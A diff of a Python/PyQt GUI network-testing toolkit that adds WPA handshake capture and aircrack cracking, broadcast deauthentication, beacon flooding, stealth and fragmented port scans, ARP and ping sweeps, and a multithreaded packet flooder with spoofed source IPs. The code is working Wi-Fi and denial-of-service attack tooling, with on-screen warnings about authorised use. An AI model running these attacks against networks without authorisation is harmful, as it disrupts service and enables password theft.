+            self.wpa_crack_output.appendPlainText("\n\n---> PASSWORD FOUND! <---")
+            self.aircrack_thread.stop()
+
+    def _on_aircrack_finished(self, return_code):
+        self.wpa_crack_btn.setText("Start Cracking")
+        self.wpa_crack_output.appendPlainText(f"\n--- Process finished with exit code {return_code} ---")
+
+    def open_crunch_generator(self):
+        dialog = CrunchDialog(self)
+        if dialog.exec():
+            values = dialog.get_values()
+            min_len, max_len, charset, outfile = values["min"], values["max"], values["charset"], values["outfile"]
+
+            if not all([min_len, max_len, charset, outfile]):
+                QMessageBox.warning(self, "Input Error", "All fields are required to generate a wordlist.")
+                return
+
+            command = ["crunch", min_len, max_len, charset, "-o", outfile]
+
+            try:
+                self.wpa_crack_output.appendPlainText(f"Starting crunch: {' '.join(command)}")
+
+                def run_crunch():
+                    try:
+                        # Use CREATE_NO_WINDOW flag on Windows to hide the console
+                        startupinfo = None
+                        if sys.platform == "win32":
+                            startupinfo = subprocess.STARTUPINFO()
+                            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+
+                        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, startupinfo=startupinfo)
+                        for line in iter(process.stdout.readline, ''):
+                            logging.info(f"[crunch] {line.strip()}")
+                        process.wait()
+                        self.tool_results_queue.put(('crunch_finished', outfile, process.returncode))
+                    except FileNotFoundError:
+                        self.tool_results_queue.put(('error', 'Crunch Error', "'crunch' command not found. Please ensure it is installed and in your system's PATH."))
+                    except Exception as e:
+                        self.tool_results_queue.put(('error', 'Crunch Error', str(e)))
+
+                self.worker = WorkerThread(target=run_crunch, args=(self,))
+                self.worker.start()
+
+            except Exception as e:
+                QMessageBox.critical(self, "Error", f"Failed to start crunch: {e}")
+
+    def start_handshake_capture(self):
+        if self.is_tool_running:
+            self.stop_handshake_capture()
+            return
+
+        iface = self.get_selected_iface()
+        if not iface:
+            QMessageBox.warning(self, "Interface Error", "Please select a monitor-mode interface.")
+            return
+
+        bssid = self.wpa_target_combo.currentData()
+        if not bssid:
+            QMessageBox.warning(self, "Target Error", "Please select a target network.")
+            return
+
+        self.is_tool_running = True
+        self.wpa_capture_btn.setText("Stop Capture")
+        self.handshake_sniffer_thread = HandshakeSnifferThread(iface, bssid)
+        self.handshake_sniffer_thread.log_message.connect(lambda msg: self.wpa_capture_status.setText(f"Status: {msg}"))
+        self.handshake_sniffer_thread.handshake_captured.connect(self._on_handshake_captured)
+        self.handshake_sniffer_thread.start()
+
+    def stop_handshake_capture(self):
+        if self.handshake_sniffer_thread and self.handshake_sniffer_thread.isRunning():
+            self.handshake_sniffer_thread.stop()
+            self.handshake_sniffer_thread.wait()
+        self.is_tool_running = False
+        self.wpa_capture_btn.setText("Start Handshake Capture")
+        self.wpa_capture_status.setText("Status: Idle")
+
+    def _on_handshake_captured(self, bssid, file_path):
+        self.wpa_capture_status.setText(f"Status: Handshake for {bssid} captured and saved to {file_path}!")
+        self.stop_handshake_capture()
+        QMessageBox.information(self, "Success", f"Handshake captured and saved to {file_path}")
+        self.wpa_pcap_edit.setText(file_path)
+
+    def deauth_for_handshake(self):
+        bssid = self.wpa_target_combo.currentData()
+        if not bssid:
+            QMessageBox.warning(self, "Target Error", "Please select a target network to deauthenticate.")
+            return
+        args = (bssid, "ff:ff:ff:ff:ff:ff", 5)
+        self.worker = WorkerThread(_deauth_thread, args=(self, *args))
+        self.worker.start()
+        QMessageBox.information(self, "Deauth Sent", f"Sent 5 deauth packets to the network {bssid} to encourage re-association.")
+
+    def _create_deauth_tool(self):
+        widget = QWidget(); layout = QVBoxLayout(widget)
+        warning_label = QLabel("WARNING: Sending deauthentication packets can disrupt networks you do not own. Use responsibly and only on your own network for testing purposes.")
+        warning_label.setStyleSheet("color: #ffcc00;")
+        layout.addWidget(warning_label)
+        controls = QFrame(); clayout = QVBoxLayout(controls)
+        row1 = QHBoxLayout()
+        row1.addWidget(QLabel("AP BSSID (MAC):"))
+        self.deauth_bssid = QLineEdit("ff:ff:ff:ff:ff:ff")
+        self.deauth_bssid.setToolTip("The MAC address (BSSID) of the target Access Point.")
+        row1.addWidget(self.deauth_bssid)
+        clayout.addLayout(row1)
+        row2 = QHBoxLayout()
+        row2.addWidget(QLabel("Client MAC:"))
+        self.deauth_client = QLineEdit("ff:ff:ff:ff:ff:ff")
+        self.deauth_client.setToolTip("The MAC address of the client to deauthenticate.\nUse 'ff:ff:ff:ff:ff:ff' to deauthenticate all clients.")
+        row2.addWidget(self.deauth_client)
+        clayout.addLayout(row2)
+        row3 = QHBoxLayout()
+        row3.addWidget(QLabel("Count:"))
+        self.deauth_count = QLineEdit("10")
+        self.deauth_count.setToolTip("The number of deauthentication packets to send.")
+        row3.addWidget(self.deauth_count)
+        clayout.addLayout(row3)
+        self.deauth_button = QPushButton(QIcon("icons/user-minus.svg"), " Send Deauth Packets")
+        self.deauth_button.setToolTip("Start sending deauthentication packets.\nWARNING: This will disrupt the target's connection.")
+        clayout.addWidget(self.deauth_button)
+        self.deauth_status = QLabel(""); clayout.addWidget(self.deauth_status)
+        layout.addWidget(controls)
+        self.deauth_button.clicked.connect(self.start_deauth)
+        return widget
+
+    def _create_beacon_flood_tool(self):
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        warning_label = QLabel("WARNING: Flooding the air with beacon frames can disrupt Wi-Fi networks in the area. Use this tool responsibly and only for legitimate testing purposes.")
+        warning_label.setStyleSheet("color: #ffcc00;")
+        warning_label.setWordWrap(True)
+        layout.addWidget(warning_label)
+
+        controls = QFrame()
+        controls.setFrameShape(QFrame.Shape.StyledPanel)
+        clayout = QFormLayout(controls)
+
+        # SSID controls
+        ssid_layout = QHBoxLayout()
+        self.bf_ssid_edit = QLineEdit("TestNet")
+        self.bf_ssid_edit.setToolTip("A single SSID, or load multiple from a file.")
+        ssid_layout.addWidget(self.bf_ssid_edit)
+        self.bf_ssid_from_file_btn = QPushButton("Load from File")
+        self.bf_ssid_from_file_btn.setToolTip("Load a list of SSIDs from a .txt file (one per line).")
+        ssid_layout.addWidget(self.bf_ssid_from_file_btn)
+        clayout.addRow("SSID(s):", ssid_layout)
+
+        self.bf_bssid_edit = QLineEdit("random")
+        self.bf_bssid_edit.setToolTip("The BSSID (MAC address) of the fake AP. 'random' will generate a new MAC for each packet.")
+        clayout.addRow("BSSID:", self.bf_bssid_edit)
+
+        # Encryption
+        self.bf_enc_combo = QComboBox()
+        self.bf_enc_combo.addItems(["Open", "WEP", "WPA2-PSK", "WPA3-SAE"])
+        self.bf_enc_combo.setToolTip("Select the advertised encryption type for the fake network(s).")
+        clayout.addRow("Encryption:", self.bf_enc_combo)
+
+        # Channel
+        self.bf_channel_edit = QLineEdit("1")
+        self.bf_channel_edit.setToolTip("The 802.11 channel to broadcast the beacons on.")
+        clayout.addRow("Channel:", self.bf_channel_edit)
+
+        self.bf_count_edit = QLineEdit("1000")
+        self.bf_count_edit.setToolTip("The number of beacon frames to send. Use '0' for an infinite flood.")
+        clayout.addRow("Count:", self.bf_count_edit)
+
+        self.bf_interval_edit = QLineEdit("0.1")
+        self.bf_interval_edit.setToolTip("The time interval (in seconds) between sending each beacon frame.")
+        clayout.addRow("Interval:", self.bf_interval_edit)
+
+        layout.addWidget(controls)
+
+        buttons_layout = QHBoxLayout()
+        self.bf_start_button = QPushButton("Start Beacon Flood")
+        self.bf_start_button.setToolTip("Begin sending fake beacon frames.")
+        buttons_layout.addWidget(self.bf_start_button)
+
+        self.bf_stop_button = QPushButton("Stop Flood")
+        self.bf_stop_button.setEnabled(False)
+        self.bf_stop_button.setToolTip("Stop the ongoing beacon flood.")
+        buttons_layout.addWidget(self.bf_stop_button)
+        layout.addLayout(buttons_layout)
+
+        self.bf_status_label = QLabel("Status: Idle")
+        layout.addWidget(self.bf_status_label)
+        layout.addStretch()
+
+        self.bf_start_button.clicked.connect(self.start_beacon_flood)
+        self.bf_stop_button.clicked.connect(self.cancel_tool)
+        self.bf_ssid_from_file_btn.clicked.connect(self.load_ssids_for_beacon_flood)
+
+        return widget
+
+    def load_ssids_for_beacon_flood(self):
+        file_path, _ = QFileDialog.getOpenFileName(self, "Select SSID List File", "", "Text Files (*.txt);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            try:
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    self.bf_ssid_list = [line.strip() for line in f if line.strip()]
+                if self.bf_ssid_list:
+                    self.bf_ssid_edit.setText(f"Loaded {len(self.bf_ssid_list)} SSIDs from file")
+                    self.bf_ssid_edit.setReadOnly(True)
+                    logging.info(f"Loaded {len(self.bf_ssid_list)} SSIDs for beacon flood.")
+                else:
+                    self.bf_ssid_edit.setText("")
+                    self.bf_ssid_edit.setReadOnly(False)
+            except Exception as e:
+                QMessageBox.critical(self, "Error", f"Failed to load SSID file: {e}")
+
+
+
+    def save_packets(self):
+        """Saves captured packets to a pcap file."""
+        if not self.sniffer_tab.packets_data: QMessageBox.information(self, "Info", "There are no packets to save."); return
+        file_path, _ = QFileDialog.getSaveFileName(self, "Save Packets", "", "Pcap Files (*.pcap *.pcapng);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            try: wrpcap(file_path, self.sniffer_tab.packets_data); self.status_bar.showMessage(f"Saved {len(self.sniffer_tab.packets_data)} packets to {file_path}")
+            except Exception as e: QMessageBox.critical(self, "Error", f"Failed to save packets: {e}")
+
+    def load_packets(self):
+        """Loads packets from a pcap file into the sniffer view."""
+        if self.sniffer_tab.packets_data and QMessageBox.question(self, "Confirm", "Clear captured packets?", QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.No: return
+        self.sniffer_tab.clear_sniffer_display()
+        file_path, _ = QFileDialog.getOpenFileName(self, "Load Packets", "", "Pcap Files (*.pcap *.pcapng);;All Files (*)", options=QFileDialog.Option.DontUseNativeDialog)
+        if file_path:
+            try:
+                loaded_packets = rdpcap(file_path)
+                for packet in loaded_packets: self.sniffer_tab.add_packet_to_list(packet)
+                self.status_bar.showMessage(f"Loaded {len(loaded_packets)} packets from {file_path}")
+            except Exception as e: QMessageBox.critical(self, "Error", f"Failed to load packets: {e}")
+
+    def _send_thread(self, c, i):
+        iface = self.get_selected_iface()
+        q = self.tool_results_queue
+        try:
+            ans_list = []
+            unans_list = []
+            for pkt_num in range(c):
+                if self.tool_stop_event.is_set():
+                    logging.info("Packet sending cancelled.")
+                    break
+
+                pkt = self.build_packet()
+                if not pkt:
+                    logging.error("Failed to build packet in send thread.")
+                    break
+
+                send_receive_func = srp1 if pkt.haslayer(Ether) else sr1
+                reply = send_receive_func(pkt, timeout=2, iface=iface, verbose=0)
+                if reply:
+                    ans_list.append((pkt, reply))
+                else:
+                    unans_list.append(pkt)
+                time.sleep(i)
+            q.put(('send_results', ans_list, unans_list))
+        except Exception as e:
+            logging.error("Send packet failed", exc_info=True)
+            q.put(('error', 'Send Error', str(e)))
+        finally:
+            q.put(('send_finished',))
+
+    def start_traceroute(self):
+        """Starts the traceroute worker thread."""
+        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
+        t = self.trace_target.text()
+        if not t: QMessageBox.critical(self, "Error", "Please enter a target."); return
+        self.trace_button.setEnabled(False)
+        self.trace_cancel_button.setEnabled(True)
+        self.is_tool_running = True
+        self.tool_stop_event.clear()
+        self.worker = WorkerThread(_traceroute_thread, args=(self, t,)); self.worker.start()
+
+    def _traceroute_thread(self,t):
+        q=self.tool_results_queue; iface=self.get_selected_iface()
+        logging.info(f"Traceroute thread started for target: {t} on iface: {iface}")
+        try:
+            q.put(('trace_status',f"Resolving {t}...")); dest_ip=socket.gethostbyname(t)
+            q.put(('trace_clear',)); q.put(('trace_result',("",f"Traceroute to {t} ({dest_ip})","","")))
+            for i in range(1,30):
+                if self.tool_stop_event.is_set():
+                    q.put(('trace_status', "Traceroute Canceled."))
+                    break
+                q.put(('trace_status',f"Sending probe to TTL {i}"))
+                pkt=IP(dst=dest_ip,ttl=i)/UDP(dport=33434)
+                st=time.time(); reply=sr1(pkt,timeout=2,iface=iface); rtt=(time.time()-st)*1000
+                if reply is None: q.put(('trace_result',(i,"* * *","Timeout","")))
+                else:
+                    h_ip=reply.src
+                    try: h_name,_,_=socket.gethostbyaddr(h_ip)
+                    except socket.herror: h_name="Unknown"
+                    q.put(('trace_result',(i,h_ip,h_name,f"{rtt:.2f}")))
+                    if reply.type==3 or h_ip==dest_ip: q.put(('trace_status',"Trace Complete.")); break
+            else: q.put(('trace_status',"Trace Finished (Max hops reached)."))
+        except Exception as e: logging.error("Exception in traceroute thread",exc_info=True); q.put(('error',"Traceroute Error",str(e)))
+        finally: q.put(('tool_finished','traceroute')); logging.info("Traceroute thread finished.")
+
+    def start_port_scan(self):
+        """Starts the port scanner worker thread."""
+        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
+        t=self.scan_target.text(); ps=self.scan_ports.text(); use_frags=self.scan_frag_check.isChecked()
+
+        scan_protocols = []
+        if self.scan_proto_tcp_radio.isChecked(): scan_protocols.append("TCP")
+        if self.scan_proto_udp_radio.isChecked(): scan_protocols.append("UDP")
+        if self.scan_proto_both_radio.isChecked(): scan_protocols.extend(["TCP", "UDP"])
+
+        tcp_scan_type = self.tcp_scan_type_combo.currentText() if self.tcp_scan_type_combo.isVisible() else "SYN Scan"
+
+        if not t or not ps: QMessageBox.critical(self, "Error", "Target and ports required."); return
+        try: ports=sorted(list(set(self._parse_ports(ps))))
+        except ValueError: QMessageBox.critical(self, "Error","Invalid port format. Use '22, 80, 100-200'."); return
+
+        self.scan_button.setEnabled(False)
+        self.scan_cancel_button.setEnabled(True)
+        self.is_tool_running=True
+        self.tool_stop_event.clear()
+
+        args = (t, ports, scan_protocols, tcp_scan_type, use_frags)
+        self.worker = WorkerThread(_port_scan_thread, args=(self, *args)); self.worker.start()
+
+    def _parse_ports(self,ps):
+        ports=[]
+        for part in ps.split(','):
+            part=part.strip()
+            if '-' in part: start,end=map(int,part.split('-')); ports.extend(range(start,end+1))
+            else: ports.append(int(part))
+        return ports
+
+    def _port_scan_thread(self,t,ports,scan_protocols,tcp_scan_type,use_frags):
+        q=self.tool_results_queue; iface=self.get_selected_iface()
+        logging.info(f"Port scan started: T={t}, P={ports}, Protocols={scan_protocols}, TCP_Mode={tcp_scan_type}, Frags={use_frags}")
+        scan_results = []
+        try:
+            q.put(('scan_clear',))
+            total_ports = len(ports) * len(scan_protocols)
+            ports_scanned = 0
+
+            tcp_scan_flags = {
+                "SYN Scan": "S", "FIN Scan": "F", "Xmas Scan": "FPU",
+                "Null Scan": "", "ACK Scan": "A"
+            }
+
+            for protocol in scan_protocols:
+                if self.tool_stop_event.is_set(): break
+                for port in ports:
+                    if self.tool_stop_event.is_set(): break
+
+                    ports_scanned += 1
+                    status_msg = f"Scanning {t}:{port} ({protocol}"
+                    if protocol == "TCP": status_msg += f"/{tcp_scan_type}"
+                    status_msg += f") - {ports_scanned}/{total_ports}"
+                    q.put(('scan_status', status_msg))
+
+                    pkt = None
+                    if protocol == "TCP":
+                        flags = tcp_scan_flags.get(tcp_scan_type, "S")
+                        pkt = IP(dst=t)/TCP(dport=port, flags=flags)
+                    elif protocol == "UDP":
+                        pkt = IP(dst=t)/UDP(dport=port)
+
+                    if not pkt: continue
+
+                    probes = fragment(pkt) if use_frags else [pkt]
+                    # Only need one response, not for every fragment
+                    resp=sr1(probes[0] if len(probes) == 1 else probes, timeout=1, iface=iface, verbose=0)
+                    state = "No Response / Filtered"
+                    if resp:
+                        if resp.haslayer(TCP):
+                            if resp.getlayer(TCP).flags == 0x12: state = "Open" # SYN-ACK
+                            elif resp.getlayer(TCP).flags == 0x14: state = "Closed" # RST-ACK
+                            elif resp.getlayer(TCP).flags == 0x4: state = "Unfiltered (RST)" # RST from ACK scan
+                        elif resp.haslayer(UDP):
+                            state = "Open | Filtered" # UDP is connectionless, open might not respond
+                        elif resp.haslayer(ICMP) and resp.getlayer(ICMP).type == 3:
+                            if resp.getlayer(ICMP).code in [1, 2, 3, 9, 10, 13]:
+                                state = "Filtered"
+                            else:
+                                state = "Closed (ICMP)"
+
+                    service = "Unknown"
+                    if state.startswith("Open"):
+                        try: service=socket.getservbyport(port, protocol.lower())
+                        except OSError: pass
+
+                    # Add to list for final popup and also to queue for live view
+                    result_tuple = (f"{port}/{protocol.lower()}", state, service)
+                    scan_results.append(result_tuple)
+                    q.put(('scan_result', result_tuple))
+
+            if self.tool_stop_event.is_set():
+                q.put(('scan_status', "Scan Canceled."))
+            else:
+                q.put(('scan_status',"Scan Complete."))
+                q.put(('show_port_scan_popup', scan_results, t)) # New message for popup
+        except Exception as e: logging.error("Exception in port scan thread",exc_info=True); q.put(('error',"Scan Error",str(e)))
+        finally: q.put(('tool_finished','scanner')); logging.info("Port scan thread finished.")
+
+    def start_arp_scan(self):
+        """Starts the ARP scan worker thread."""
+        if self.is_tool_running: QMessageBox.warning(self, "Busy", "Another tool is already running."); return
+        t=self.arp_target.text()
+        if not t: QMessageBox.critical(self, "Error", "Please enter a target network."); return
+        self.arp_scan_button.setEnabled(False); self.is_tool_running=True
+        self.worker = WorkerThread(_arp_scan_thread, args=(self, t,)); self.worker.start()
+
+    def _arp_scan_thread(self,t):
+        q=self.tool_results_queue; iface=self.get_selected_iface()
+        logging.info(f"ARP scan thread started for target: {t} on iface: {iface}")
+        try:
+            q.put(('arp_status', f"Scanning {t}...")); q.put(('arp_clear',))
+            pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=t)
+            ans,unans=srp(pkt,timeout=2,iface=iface,verbose=0)
+
+            # Keep adding to tree for live results
+            answered_results_for_tree = [{'ip': r.psrc, 'mac': r.hwsrc, 'status': 'Responded'} for s, r in ans]
+            if answered_results_for_tree:
+                q.put(('arp_results', answered_results_for_tree))
+
+            # Now prepare results for popup
+            popup_results = []
+            q.put(('arp_status', f"Found {len(ans)} hosts. Resolving vendors..."))
+            for i, (s, r) in enumerate(ans):
+                q.put(('arp_status', f"Resolving vendor for {r.hwsrc} ({i+1}/{len(ans)})"))
+                vendor = get_vendor(r.hwsrc)
+                popup_results.append({'ip': r.psrc, 'mac': r.hwsrc, 'vendor': vendor})
+
+            total_found = len(ans)
+            q.put(('arp_status',f"Scan Complete. Found {total_found} active hosts."))
+            q.put(('show_arp_scan_popup', popup_results, t)) # New message for popup
+
+        except Exception as e: logging.error("Exception in ARP scan thread",exc_info=True); q.put(('error',"ARP Scan Error",str(e)))
+        finally: q.put(('tool_finished','arp_scan')); logging.info("ARP scan thread finished.")
+
+    def _create_arp_scan_cli_tool(self):
+        """Creates the UI for the arp-scan CLI tool."""
+        widget = QWidget()
+        layout = QVBoxLayout(widget)
+
+        config_widget, self.arp_scan_cli_controls = self._create_arp_scan_cli_config_widget()
+        layout.addWidget(config_widget)
+
+        # --- Action Buttons ---
+        buttons_layout = QHBoxLayout()
+        buttons_layout.addWidget(self.arp_scan_cli_controls['start_btn'])
+        buttons_layout.addWidget(self.arp_scan_cli_controls['stop_btn'])
+        layout.addLayout(buttons_layout)
+
+        # --- Output Console ---
+        self.arp_scan_cli_output_console = QPlainTextEdit()
+        self.arp_scan_cli_output_console.setReadOnly(True)
+        self.arp_scan_cli_output_console.setFont(QFont("Courier New", 10))
+        self.arp_scan_cli_output_console.setPlaceholderText("arp-scan output will be displayed here...")
+        layout.addWidget(self.arp_scan_cli_output_console, 1)
+
+        self.arp_scan_cli_controls['start_btn'].clicked.connect(self.start_arp_scan_cli)
+        self.arp_scan_cli_controls['stop_btn'].clicked.connect(self.cancel_tool)
+
+        return widget
+
+    def _create_arp_scan_cli_config_widget(self):
+        """Creates a reusable, self-contained widget with arp-scan's configuration options."""
+        widget = QWidget()
+        main_layout = QFormLayout(widget)
+        controls = {}
+
+        controls['localnet_check'] = QCheckBox("Scan Local Network (--localnet)")
+        controls['localnet_check'].setChecked(True)
+        controls['localnet_check'].setToolTip("Automatically scan the network of the selected interface.")
+        main_layout.addRow(controls['localnet_check'])
+
+        controls['target_edit'] = QLineEdit()
+        controls['target_edit'].setPlaceholderText("e.g., 192.168.1.0/24 (optional if --localnet is checked)")
+        controls['target_edit'].setToolTip("Specify a custom target network or host if not using --localnet.")
+        main_layout.addRow("Custom Target:", controls['target_edit'])
+
+        controls['verbose_check'] = QCheckBox("Verbose Output (-v)")
+        main_layout.addRow("--verbose:", controls['verbose_check'])
+
+        # UI Logic
+        def toggle_target_edit(checked):
+            controls['target_edit'].setDisabled(checked)
+        controls['localnet_check'].toggled.connect(toggle_target_edit)
+        toggle_target_edit(True) # Initial state
+
+        controls['start_btn'] = QPushButton(QIcon("icons/search.svg"), " Start Scan")
+        controls['stop_btn'] = QPushButton("Stop Scan"); controls['stop_btn'].setEnabled(False)
+
+        return widget, controls
+
+    def start_arp_scan_cli(self):
+        """Starts the arp-scan CLI worker thread."""
+        controls = self.arp_scan_cli_controls
+        if not shutil.which("arp-scan"):
+            QMessageBox.critical(self, "arp-scan Error", "'arp-scan' command not found. Please ensure it is installed and in your system's PATH.")
+            return
+
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        command = ["arp-scan"]
+
+        iface = self.get_selected_iface()
+        if iface:
+            command.extend(["--interface", iface])
+
+        if controls['localnet_check'].isChecked():
+            command.append("--localnet")
+        else:
+            target = controls['target_edit'].text().strip()
+            if not target:
+                QMessageBox.critical(self, "Input Error", "A custom target is required if --localnet is not checked.")
+                return
+            command.append(target)
+
+        if controls['verbose_check'].isChecked():
+            command.append("--verbose")
+
+        self.is_tool_running = True
+        controls['start_btn'].setEnabled(False)
+        controls['stop_btn'].setEnabled(True)
+        self.tool_stop_event.clear()
+        self.arp_scan_cli_output_console.clear()
+
+        self.worker = WorkerThread(_arp_scan_cli_thread, args=(self, command,))
+        self.active_threads.append(self.worker)
+        self.worker.start()
+
+    def _arp_scan_cli_thread(self, command):
+        """Worker thread for running the arp-scan command."""
+        q = self.tool_results_queue
+        logging.info(f"Starting arp-scan with command: {' '.join(command)}")
+        q.put(('arp_scan_cli_output', f"$ {' '.join(command)}\n\n"))
+
+        try:
+            startupinfo = None
+            if sys.platform == "win32":
+                q.put(('error', 'Platform Error', 'arp-scan is not supported on Windows.'))
+                q.put(('tool_finished', 'arp_scan_cli_scan'))
+                return
+
+            process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
+
+            with self.thread_finish_lock:
+                self.arp_scan_cli_process = process
+
+            for line in iter(process.stdout.readline, ''):
+                if self.tool_stop_event.is_set():
+                    process.terminate()
+                    q.put(('arp_scan_cli_output', "\n\n--- Scan Canceled By User ---\n"))
+                    break
+                q.put(('arp_scan_cli_output', line))
+
+            process.stdout.close()
+            process.wait()
+
+        except FileNotFoundError:
+            q.put(('error', 'arp-scan Error', "'arp-scan' command not found. Please ensure it is installed and in your system's PATH."))
+        except Exception as e:
+            logging.error(f"arp-scan thread error: {e}", exc_info=True)
+            q.put(('error', 'arp-scan Error', str(e)))
+        finally:
+            q.put(('tool_finished', 'arp_scan_cli_scan'))
+            with self.thread_finish_lock:
+                self.arp_scan_cli_process = None
+            logging.info("arp-scan scan thread finished.")
+
+    def _handle_arp_scan_cli_output(self, line):
+        self.arp_scan_cli_output_console.insertPlainText(line)
+        self.arp_scan_cli_output_console.verticalScrollBar().setValue(self.arp_scan_cli_output_console.verticalScrollBar().maximum())
+
+    def start_ping_sweep(self):
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        target_network = self.ps_target_edit.text()
+        probe_type = self.ps_probe_type_combo.currentText()
+        ports_str = self.ps_ports_edit.text()
+
+        try:
+            net = ipaddress.ip_network(target_network, strict=False)
+            timeout = float(self.ps_timeout_edit.text())
+            num_threads = int(self.ps_threads_edit.text())
+            ports = [int(p.strip()) for p in ports_str.split(',')] if ports_str else []
+        except ValueError as e:
+            QMessageBox.critical(self, "Input Error", f"Invalid input: {e}")
+            return
+
+        if ("TCP" in probe_type or "UDP" in probe_type) and not ports:
+            QMessageBox.critical(self, "Input Error", "Please specify at least one port for TCP/UDP probes.")
+            return
+
+        self.is_tool_running = True
+        self.ps_start_button.setEnabled(False)
+        self.ps_cancel_button.setEnabled(True)
+        self.tool_stop_event.clear()
+        self.ps_tree.clear()
+
+        args = (net, probe_type, ports, timeout, num_threads)
+        self.worker = WorkerThread(_ping_sweep_thread, args=(self, *args))
+        self.worker.start()
+
+    def _ping_sweep_thread(self, net, probe_type, ports, timeout, num_threads):
+        """Master thread that populates a queue and starts worker threads."""
+        q = self.tool_results_queue
+        logging.info(f"Ping sweep started for {net} with {probe_type} on ports {ports}")
+
+        hosts_queue = queue.Queue()
+        for host in net.hosts():
+            hosts_queue.put(str(host))
+
+        if hosts_queue.qsize() == 0:
+            q.put(('ps_status', "Sweep Complete (No hosts in range)."))
+            q.put(('tool_finished', 'ping_sweep'))
+            return
+
+        self.ps_finished_threads = 0
+        self.active_threads = []
+
+        for i in range(num_threads):
+            worker = WorkerThread(target=self._ping_sweep_worker, args=(hosts_queue, probe_type, ports, timeout, num_threads))
+            self.active_threads.append(worker)
+            worker.start()
+
+    def _ping_sweep_worker(self, hosts_queue, probe_type, ports, timeout, num_threads):
+        """Worker function that each ping sweep thread executes."""
+        q = self.tool_results_queue
+        while not self.tool_stop_event.is_set():
+            try:
+                host_str = hosts_queue.get_nowait()
+            except queue.Empty:
+                break # Queue is empty, this thread is done
+
+            q.put(('ps_status', f"Pinging {host_str}..."))
+
+            reply = None
+            try:
+                if probe_type == "ICMP Echo":
+                    pkt = IP(dst=host_str)/ICMP()
+                    reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
+                elif probe_type == "TCP SYN":
+                    for port in ports:
+                        pkt = IP(dst=host_str)/TCP(dport=port, flags="S")
+                        reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
+                        if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x12: # SYN-ACK
+                            break # Host is up, no need to check other ports
+                elif probe_type == "TCP ACK":
+                    for port in ports:
+                        pkt = IP(dst=host_str)/TCP(dport=port, flags="A")
+                        reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
+                        if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x4: # RST
+                            break # Host is up, no need to check other ports
+                elif probe_type == "UDP Probe":
+                    for port in ports:
+                        pkt = IP(dst=host_str)/UDP(dport=port)
+                        reply = sr1(pkt, timeout=timeout, verbose=0, iface=self.get_selected_iface())
+                        if reply and reply.haslayer(ICMP) and reply.getlayer(ICMP).type == 3: # Dest Unreachable
+                            break # Port is closed, but host is up.
+            except Exception as e:
+                logging.warning(f"Probe to {host_str} failed: {e}")
+
+
+            if reply:
+                q.put(('ps_result', (host_str, "Host is up")))
+
+        # Signal that this worker is done
+        q.put(('ps_worker_finished', num_threads))
+
+    def load_flood_packet(self):
+        packet=self.build_packet()
+        if not packet: QMessageBox.critical(self, "Error", "Please craft a packet in the Packet Crafter tab first."); return
+        self.loaded_flood_packet=packet
+        self.flood_packet_label.setText(f"Loaded: {self.loaded_flood_packet.summary()}")
+        logging.info(f"Loaded flood packet: {self.loaded_flood_packet.summary()}")
+
+    def start_flood(self):
+        """Starts the packet flooder worker threads."""
+        if self.is_tool_running:
+            QMessageBox.warning(self, "Busy", "Another tool is already running.")
+            return
+
+        template = self.flood_template_combo.currentText()
+        if template == "Custom (from Crafter)" and not self.loaded_flood_packet:
+            QMessageBox.critical(self, "Error", "Please load a packet from the crafter first.")
+            return
+
+        warning_msg = "WARNING: This tool sends a high volume of packets and can disrupt network services. Only use this tool on networks you own or have explicit permission to test. Misuse of this tool may be illegal.\n\nDo you accept responsibility and wish to continue?"
+        if not QMessageBox.question(self, "Ethical Use Warning", warning_msg, QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.Yes:
+            return
+
+        try:
+            count = int(self.flood_count.text())
+            interval = float(self.flood_interval.text())
+            num_threads = int(self.flood_threads.text())
+            target_ip = self.flood_target_edit.text()
+            target_port = int(self.flood_ports_edit.text()) if self.flood_ports_edit.text() else 80
+            random_source = self.flood_rand_src_ip_check.isChecked()
+        except ValueError:
+            QMessageBox.critical(self, "Error", "Invalid count, interval, or thread number.")
+            return
+
+        self.flood_button.setEnabled(False)
+        self.stop_flood_button.setEnabled(True)
+        self.is_tool_running = True
+        self.finished_thread_count = 0
+        self.active_threads = []
+        self.tool_stop_event.clear()
+
+        packets_per_thread = count // num_threads
+        extra_packets = count % num_threads
+
+        flood_params = {
+            "template": template, "target_ip": target_ip, "target_port": target_port,
+            "random_source": random_source, "custom_packet": self.loaded_flood_packet
+        }
+
+        for i in range(num_threads):
+            count_for_this_thread = packets_per_thread + (1 if i < extra_packets else 0)
+            if count_for_this_thread == 0:
+                continue
+
+            worker = WorkerThread(_flood_thread, args=(self, flood_params, count_for_this_thread, interval, num_threads))
+            self.active_threads.append(worker)
+            worker.start()
+
+    def _flood_thread(self, params, count, interval, total_threads):
+        q = self.tool_results_queue
+        iface = self.get_selected_iface()
+        logging.info(f"Flood thread started. Params: {params}, Count: {count}")
+        try:
+            q.put(('flood_status', f"Flooding with {count} packets..."))
+            send_func = sendp # Assume Layer 2 for templates for now
+
+            for i in range(count):
+                if self.tool_stop_event.is_set():
+                    logging.info("Flood thread detected stop event.")
+                    break
+
+                pkt = None
+                template = params["template"]
+
+                if template == "Custom (from Crafter)":
+                    pkt = params["custom_packet"]
